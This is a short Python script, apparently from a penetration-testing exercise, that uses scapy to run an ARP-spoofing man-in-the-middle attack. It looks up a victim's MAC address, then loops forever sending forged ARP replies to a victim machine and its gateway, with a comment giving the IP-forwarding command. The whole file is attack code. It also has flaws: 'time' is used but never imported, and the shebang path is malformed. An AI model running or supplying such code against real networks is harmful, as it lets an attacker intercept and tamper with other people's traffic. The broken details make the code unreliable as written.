#!usr/bin/python3
import scapy.all as scapy


def get_mac(ip):
    # scapy.arping(ip)
    # prepare the packet to send all over the network
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')

    # send the packet to the network and receive the answer
    arp_request_broadcast = broadcast/arp_request
    ansewered_list = scapy.srp(
        arp_request_broadcast, timeout=1, verbose=False)[0]

    # get the MAC address of the victim's machine
    return ansewered_list[0][1].hwsrc


# packet prepared --> Kali machine become the router
# e.g.: target_ip=192.168.82.219(victim machine)
# e.g.: router_ip=192.168.82.209(gateway/router machine)

def spoof(target_ip, router_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)

    # send the packet to spoof the victim
    scapy.send(packet)
    # print(packet.show())
    # print(packet.summary())

# maintain the spoof as long as I want 
# but we need to forward ports to give inernet to the victim machine
# echo 1 > /proc/sys/net/ipv4/ip_forward
while True:
    spoof('192.168.82.219', '192.168.82.209')
    spoof('192.168.82.209', '192.168.82.219')
    time.sleep(2)
